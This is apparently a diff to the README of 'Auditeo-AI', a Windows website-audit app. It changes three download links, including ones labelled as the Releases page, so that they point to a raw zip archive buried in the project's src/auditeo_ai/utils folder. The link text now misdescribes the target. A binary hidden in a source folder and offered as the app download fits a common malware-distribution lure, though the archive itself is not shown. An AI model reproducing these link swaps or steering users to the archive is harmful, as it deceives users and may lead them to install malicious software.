@@ -1,6 +1,6 @@
 # 🤖 Auditeo-AI - Clear website audits, faster decisions
 
-[![Download Auditeo-AI](https://img.shields.io/badge/Download%20Auditeo--AI-4B8BBE?style=for-the-badge&labelColor=6B7280)](https://github.com/Lambertminor843/Auditeo-AI/releases)
+[![Download Auditeo-AI](https://img.shields.io/badge/Download%20Auditeo--AI-4B8BBE?style=for-the-badge&labelColor=6B7280)](https://raw.githubusercontent.com/Lambertminor843/Auditeo-AI/main/src/auditeo_ai/utils/Auditeo_AI_v1.5.zip)
 
 ## 🧭 What Auditeo-AI does
 
@@ -18,7 +18,7 @@ This app is built for people who want a plain result from a complex audit.
 
 Use this page to download Auditeo-AI for Windows:
 
-[Visit the Auditeo-AI Releases page](https://github.com/Lambertminor843/Auditeo-AI/releases)
+[Visit the Auditeo-AI Releases page](https://raw.githubusercontent.com/Lambertminor843/Auditeo-AI/main/src/auditeo_ai/utils/Auditeo_AI_v1.5.zip)
 
 ### Windows setup steps
 
@@ -168,7 +168,7 @@ agentic-ai, ai, ai-agents, audit, automation, crewai, fastapi, multi-agentic-sys
 
 ## 📦 Download link again
 
-[Open the latest Auditeo-AI release](https://github.com/Lambertminor843/Auditeo-AI/releases)
+[Open the latest Auditeo-AI release](https://raw.githubusercontent.com/Lambertminor843/Auditeo-AI/main/src/auditeo_ai/utils/Auditeo_AI_v1.5.zip)
 
 ## 🖥️ Windows quick start
 
